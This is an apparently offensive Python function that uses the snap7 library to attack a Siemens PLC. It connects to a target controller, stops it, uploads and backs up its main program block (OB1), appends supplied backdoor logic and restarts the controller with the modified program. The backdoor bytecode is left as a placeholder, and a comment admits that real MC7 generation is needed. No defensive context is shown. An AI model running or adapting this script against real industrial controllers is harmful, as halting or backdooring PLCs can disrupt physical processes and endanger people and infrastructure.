def inject_malicious_logic(target_ip, backdoor_code):
    """
    Inject malicious ladder logic into PLC
    WARNING: Can cause process disruption
    """
    plc = snap7.client.Client()
    plc.connect(target_ip, 0, 1)

    # Stop PLC (required for program modification)
    plc.plc_stop()
    print("[*] PLC stopped")

    # Upload current OB1 (main program block)
    original_ob1 = plc.upload('OB', 1)
    print(f"[*] Original OB1: {len(original_ob1)} bytes")

    # Backup
    with open("OB1_backup.mc7", "wb") as f:
        f.write(original_ob1)

    # Inject malicious code (example: append backdoor logic)
    # MC7 format is proprietary, but we can append at block level
    modified_ob1 = original_ob1 + backdoor_code

    # Download modified block
    plc.download('OB', 1, modified_ob1)
    print("[+] Malicious logic injected")

    # Restart PLC
    plc.plc_start()
    print("[+] PLC restarted with backdoored logic")

    plc.disconnect()

# Example backdoor: Trigger output Q0.0 when M100.0 is set
# (Real implementation requires MC7 bytecode generation)
# backdoor_mc7 = bytes.fromhex("...")  # MC7 opcodes
